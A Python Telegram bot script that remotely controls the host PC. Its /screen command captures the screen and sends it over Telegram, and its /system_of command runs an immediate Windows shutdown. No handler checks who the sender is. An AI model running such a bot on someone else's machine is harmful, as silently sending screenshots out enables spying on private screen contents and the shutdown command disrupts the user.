import os

import pyautogui as pg
from aiogram import Bot, Dispatcher, executor, types

from config import TOKEN

bot = Bot(token=TOKEN)
dp = Dispatcher(bot=bot)
btns = ['/screen', '/system']


@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add(*btns)
    await bot.send_message(message.from_user.id, 'hello', reply_markup=keyboard)


@dp.message_handler(commands=['screen'])
async def screen(message: types.Message):
    img = pg.screenshot('scr.png')
    photo = open('scr.png', 'rb')
    await bot.send_photo(message.from_user.id, photo)


@dp.message_handler(commands='system')
async def system_of(message: types.Message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btns = ['/system_of']
    keyboard.add(*btns)
    await bot.send_message(message.from_user.id, 'Ok change what do you need', reply_markup=keyboard)


@dp.message_handler(commands='system_of')
async def system_of(message: types.Message):
    await bot.send_message(message.from_user.id, 'ok, bye!')
    os.system('shutdown /s /t 1')


if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
